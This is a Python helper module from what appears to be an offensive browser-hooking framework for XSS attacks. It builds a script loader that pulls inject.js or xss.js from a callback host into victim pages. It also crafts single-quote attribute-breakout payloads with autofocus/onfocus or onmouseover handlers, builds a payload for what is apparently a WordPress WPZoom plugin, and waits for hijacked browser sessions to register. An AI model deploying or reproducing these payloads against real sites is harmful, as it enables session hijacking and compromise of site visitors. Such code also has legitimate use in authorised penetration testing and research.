#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Helpers for HTTP XSS modules that hook victims into browser_server."""

from __future__ import annotations

import json
import time
from typing import Optional, Set

from core.output_handler import print_info, print_status, print_success, print_warning


def url_host_for_callback(host: str) -> str:
    text = str(host or "127.0.0.1").strip()
    if text in {"0.0.0.0", "::", "::0"}:
        return "127.0.0.1"
    if text.startswith("::ffff:"):
        return text.split(":", 2)[-1]
    return text or "127.0.0.1"


class XssBrowserHookMixin:
    """Mixin for XSS modules that load browser_server inject.js into victim pages."""

    def _get_browser_server(self):
        framework = getattr(self, "framework", None)
        server = getattr(framework, "browser_server", None) if framework else None
        if server and getattr(server, "is_running", lambda: False)():
            return server
        return None

    def _opt_value(self, option) -> str:
        if hasattr(option, "value"):
            return str(option.value or "").strip()
        if option is not None:
            return str(option or "").strip()
        return ""

    def resolve_hook_base_url(self, callback_host: str = "") -> str:
        manual = str(callback_host or "").strip()
        if manual:
            if manual.startswith("http://") or manual.startswith("https://"):
                return manual.rstrip("/")
            return f"http://{manual}"

        server = self._get_browser_server()
        if server:
            host = url_host_for_callback(getattr(server, "host", "127.0.0.1"))
            port = int(getattr(server, "port", 8080) or 8080)
            return f"http://{host}:{port}"

        for attr in ("callback_host", "lhost"):
            if hasattr(self, attr):
                text = self._opt_value(getattr(self, attr))
                if text:
                    return f"http://{text}:8080"

        return "http://127.0.0.1:8080"

    def build_inject_js_loader_js(
        self,
        *,
        callback_host: str = "",
        use_xss_js: bool = True,
    ) -> str:
        base = self.resolve_hook_base_url(callback_host)
        script_name = "xss.js" if use_xss_js else "inject.js"
        inject_url = f"{base}/{script_name}"
        return (
            f'var s=document.createElement("script");'
            f's.src="{inject_url}";'
            f"document.head.appendChild(s);"
        )

    @staticmethod
    def normalize_trigger_mode(trigger: str) -> str:
        value = str(trigger or "autofocus").strip().lower()
        return value if value in {"autofocus", "mouseover"} else "autofocus"

    @staticmethod
    def reflection_event_attribute(trigger: str) -> str:
        return "onfocus" if XssBrowserHookMixin.normalize_trigger_mode(trigger) == "autofocus" else "onmouseover"

    def build_attribute_breakout_class(
        self,
        js_expression: str,
        *,
        prefix: str = "x",
        trigger: str = "mouseover",
    ) -> str:
        """Break out of class='...' via single-quote injection (sanitize_text_field safe)."""
        expr = str(js_expression or "").replace("'", "\\'")
        mode = self.normalize_trigger_mode(trigger)
        if mode == "autofocus":
            return f"{prefix}' tabindex='0' autofocus onfocus='{expr}' y='"
        return f"{prefix}' onmouseover='{expr}' y='"

    def build_reflection_needle(self, js_expression: str, *, trigger: str = "mouseover") -> str:
        attr = self.reflection_event_attribute(trigger)
        return f"{attr}='{js_expression}'"

    def build_wpzoom_posts_data(self, class_value: str, *, source: str = "post") -> str:
        return json.dumps({"source": source, "class": class_value}, separators=(",", ":"))

    def wait_for_browser_session(
        self,
        *,
        timeout: float = 120.0,
        poll_interval: float = 2.0,
        known_sessions: Optional[Set[str]] = None,
    ) -> Optional[str]:
        server = self._get_browser_server()
        if not server:
            print_warning("Browser server not running — cannot wait for session")
            return None

        known = set(known_sessions or [])
        if not known:
            known = set((getattr(server, "sessions", {}) or {}).keys())

        deadline = time.time() + float(timeout)
        print_status(f"Waiting up to {int(timeout)}s for a new browser session...")

        while time.time() < deadline:
            for sid in (getattr(server, "sessions", {}) or {}):
                if sid not in known:
                    print_success(f"New browser session: {sid}")
                    print_info("Interact: sessions -i <id>  |  browser_auxiliary/* with session_id")
                    return sid
            time.sleep(poll_interval)

        print_warning("No new browser session registered within timeout")
        return None
